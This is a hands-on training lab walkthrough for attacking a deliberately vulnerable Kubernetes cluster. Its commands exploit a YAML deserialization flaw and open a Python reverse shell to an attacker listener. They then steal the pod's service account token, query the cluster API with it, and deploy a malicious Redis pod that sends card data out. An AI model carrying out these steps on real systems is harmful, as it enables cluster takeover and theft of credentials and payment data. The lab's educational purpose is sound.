# Attacking a Kubernetes Cluster



### Start the Vulnerable K8s Cluster

##### Step 1:

* Navigate to `K8s-Cluster-Attack` directory

```bash
cd /root/container_training/Kubernetes/K8s-Cluster-Attack
```

* Multiplex terminal session with tmux, run: `tmux`


##### Step 2:


* Setup the insecure cluster and start the flask stack to be run on the cluster. Wait for the command to complete.

```bash
./setup_insecure_kube.sh

./setup_flask_stack.sh
```

* Verify that the flask stack is `running` and make sure the `Status` is `Running`

```bash
kubectl get pods
```

* Check for running services. You should see `ngflask-redis-service` and its `ClusterIP`. 

```bash
kubectl get svc
```

* Set the URL of ngflask-redis as an Environment variable

```bash
NGFLASK=http://$(kubectl get svc ngflask-redis-service -o yaml | grep "clusterIP" |awk '{print $2}')

echo $NGFLASK
```

* Check if the service is running correctly. It should respond with `Please POST JSON requests to this URL`.

```bash
curl -XGET $NGFLASK
```

### Generating Artifacts


##### Step 3:

* Create a few transactions on the Application

```bash
curl -XGET $NGFLASK/generate
```

It should come back with the following response

```
{
"success": "10 transactions generated successfully"
}
```

* Check the latest transaction that has been logged by our app

```bash
curl -XGET $NGFLASK/status
```

It should come back with a response that looks similar to the one below

```html
<html>
<head>
    <title>Latest Record</title>
</head>
<body>
  <h2>Latest Transaction Status</h2>

      <h3>amount: 430</h3>

      <h3>name: Cynthia Robinson</h3>

      <h3>card: ********9238</h3>

      <h3>expiration: 1227</h3>

      <h3>Status: Success</h3>
</body>
</html>
```


#### Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉

### Exploiting a Deserialization Flaw

###### Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.

###### Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.


##### Step 4:

* Navigate to `payloads` directory that has malicious yaml files

```bash
cd /root/container_training/Kubernetes/K8s-Cluster-Attack/payloads
```

* Upload a malicious yaml file and identify the flaw

```bash
http --form POST $NGFLASK/upload file@test_payment.yml
```

It should come back with a response similar to the one below

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:35:30 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

* Verify if the malicious transaction that was generated.

```bash
curl -XGET $NGFLASK/status
```

You should see a dump of all Environment variable on the container

### Reverse TCP Shell on our K8s Cluster

##### Step 5:

* Get the Server-IP and copy the value.

```bash
serverip
```

* In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `<serverip>` with value of `serverip` fetched in the previous step.

```bash
sed -i -e 's/Server_IP_Here/<serverip>/g' reverse_shell.yml
```

EXAMPLE:

```
["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]
```

* Create and split panes horizontally with `ctrl + b + Shift+"`

* Ensure you're in low lower panel. If you are not, Run: `ctrl + b + (lower arrow key)`

* Start netcat listener

```bash
nc -l 1337
```

* Go to the upper pane with `ctrl + b + (upper arrow key)`

* Post the malicious `reverse_shell.yml`.

```bash
http --form POST $NGFLASK/upload file@reverse_shell.yml
```

It should come back with a response similar to the one below

```
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 26
Content-Type: application/json
Date: Thu, 03 Jan 2019 14:38:49 GMT
Server: nginx/1.11.13

{
    "success": "stored"
}
```

On the tab running netcat, you should have gotten a netcat reverse TCP shell! The output on the tab running netcat will be similar to the one below.

```
nc -l 1337
/bin/sh: can't access tty; job control turned off
/app #
```

Now you can interact with your target app and backend K8s cluster

**NOTE: Do NOT use the `clear` or `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do Step 5**

### Pivoting to K8s cluster

##### Step 6:

* In the reverse shell, navigate within the pod to fetch `Service Account` token.

* To go to the lower pane with netcat reverse TCP shell, run `ctrl + b + (lower arrow key)`


```bash
cd /run/secrets/kubernetes.io/serviceaccount

export TOKEN=$(cat token)
```

###### We are now going to masquerade with the cluster-admin's token.

* Start interacting with K8s API. To get a JSON dump of all pods running, run

```bash
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure
```

* Fetch the `clusterIP` of `redis-service` and note the value. 

```bash
curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" --insecure | grep -E '("redis-service"|clusterIP)'
```

The response will be similar to the one below. Please note that the IP may differ

```
        "clusterIP": "10.96.0.1",
        "clusterIP": "10.98.196.52",
        "name": "redis-service",
        "clusterIP": "10.97.43.203", # This is the MASTERHOST IP of Redis
```

* On your machine, copy the following JSON value and make the following changes

```
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              {
                "name": "MASTERHOST",
                "value": "Redis-Service-ClusterIP-HERE"
              },
              {
                "name": "MASTERPORT",
                "value": "6379"
              },
              {
                "name": "LISTENER_IP",
                "value": "SERVERIP-HERE"
              },
              {
                "name": "LISTENER_PORT",
                "value": "9090"
              }
            ]
        }]
    }
}
EOF
```

Change the value of `MASTERHOST` with the value of redis-service `clusterIP`.

Change the value of `LISTENER_IP` with that of Server IP that can be fetched by running `serverip`

* In the reverse shell, if the `pwd` is `/run/secrets/kubernetes.io/serviceaccount` you will have to navigate to the `tmp` directory. 

```bash
cd /tmp
```

###### root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`

* Copy the edited JSON from the previous step and paste it in `/tmp` directory.

```bash
# Copy the JSON value you edited, please don't copy the one below
cat > mal-redis.json <<EOF
{
    "kind": "Pod",
    "apiVersion": "v1",
    "metadata": {
        "name": "mal-redis"
    },
    "spec": {
        "containers": [{
            "name": "mal-redis",
            "image": "we45/malicious-redis-slave",
            "env": [
              ... 
              ...
              ...
              ...
              }
            ]
        }]
    }
}
EOF
```

* Check if `mal-redis.json` has been created in '/tmp/'

```bash
ls
```

* Create the `malicious-redis` pod

```bash
curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure
```

* In the other tab, navigate to `K8s-Cluster-Attack` directory and run the `tornado server`.

* Go to the upper pane with `ctrl + b + (upper arrow key)`

```bash
cd /root/container_training/Kubernetes/K8s-Cluster-Attack

./tornado_server.py
```

You should now see all the credit-card details being posted to the tornado lister from the malicious redis pod

### Stop all the pods and services

* Stop the tornado server with `ctrl + c`

* Stop the pods and services

```bash
cd /root/container_training/Kubernetes/K8s-Cluster-Attack

kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
```

* Check if any `pods` are running and delete them

```bash
kubectl get pods

kubectl delete pod mal-redis
```
